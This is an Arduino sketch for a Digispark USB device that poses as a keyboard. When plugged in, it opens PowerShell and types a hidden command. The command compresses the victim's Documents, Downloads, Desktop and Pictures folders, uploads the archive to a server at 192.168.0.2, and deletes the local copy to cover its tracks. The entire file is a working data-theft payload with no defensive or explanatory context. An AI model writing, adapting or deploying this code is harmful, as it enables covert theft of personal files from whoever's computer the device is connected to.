#include <Arduino.h>
#include <DigiKeyboard.h>

const char* SERVER_UPLOAD = "http://192.168.0.2:5000/upload";

void setup() {

}

void loop() {
  // Open Powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  DigiKeyboard.print(F("Start-Process powershell -ArgumentList \"-WindowStyle Hidden -Command Compress-Archive -Path '$env:HOMEPATH\\Documents\\*', '$env:HOMEPATH\\Downloads\\*', '$env:HOMEPATH\\Desktop\\*', '$env:HOMEPATH\\Pictures\\*' -DestinationPath '$env:HOMEPATH\\Documents\\$env:COMPUTERNAME.zip' -Force; (New-Object System.Net.WebClient).UploadFile('"));
  DigiKeyboard.print(SERVER_UPLOAD);
  DigiKeyboard.print(F("', 'POST', '$env:HOMEPATH\\Documents\\$env:COMPUTERNAME.zip'); Remove-Item '$env:HOMEPATH\\Documents\\$env:COMPUTERNAME.zip' -Force\" -WindowStyle Hidden"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}